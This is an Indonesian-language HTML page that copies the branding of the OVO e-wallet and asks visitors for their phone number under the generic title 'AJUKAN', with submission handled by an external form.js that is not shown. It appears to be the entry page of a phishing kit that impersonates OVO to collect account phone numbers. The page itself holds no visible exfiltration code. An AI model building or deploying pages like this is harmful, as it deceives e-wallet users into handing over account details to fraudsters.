<!DOCTYPE html>
<html lang="id">

<head>

<meta charset="UTF-8">

<meta name="viewport"
content="width=device-width,
initial-scale=1.0,
maximum-scale=1.0,
user-scalable=no">

<title>AJUKAN</title>

<link rel="stylesheet"
href="form.css">

</head>

<body>

<div class="container">

    <!-- LOGO -->
    <div class="logo-wrap">

        <img
        src="assets/logo-ovo.png"
        class="logo">

    </div>

    <!-- TITLE -->
    <div class="title">

        Masukan
        <b>NOMOR HP</b>
        kamu untuk lanjut

    </div>

    <!-- INPUT BOX -->
    <div class="input-box">

        <!-- FLAG -->
        <img
        src="assets/flag-id.png"
        class="flag">

        <!-- +62 -->
        <div class="kode">

            +62

        </div>

        <!-- INPUT -->
        <input
        type="tel"
        id="phone"
        autocomplete="off"
        placeholder="812-3456-7890">

        <!-- CLEAR -->
        <div
        class="clear-btn"
        id="clearBtn">

            

        </div>

    </div>

    <!-- ERROR -->
    <div
    class="error-box"
    id="errorBox">

        Pastikan Nomor yang
        kamu masukan benar

    </div>

    <!-- DESC -->
    <div class="desc">

        Dengan melanjutkan,
        kamu setuju dengan
        <b>Ketentuan Layanan</b>
         serta
        <b>Kebijakan Privasi OVO</b>
        

    </div>

    <!-- BUTTON -->
    <button id="lanjutBtn" class="btn">
    <span class="btn-text">Lanjutkan</span>
    <div id="loadingBox" class="btn-loading">
        <div class="spinner-ring"></div>
        <img src="assets/ovo-icon.png" class="loading-logo" alt="logo">
    </div>
</button>

</div>

<script src="form.js"></script>

</body>
</html>
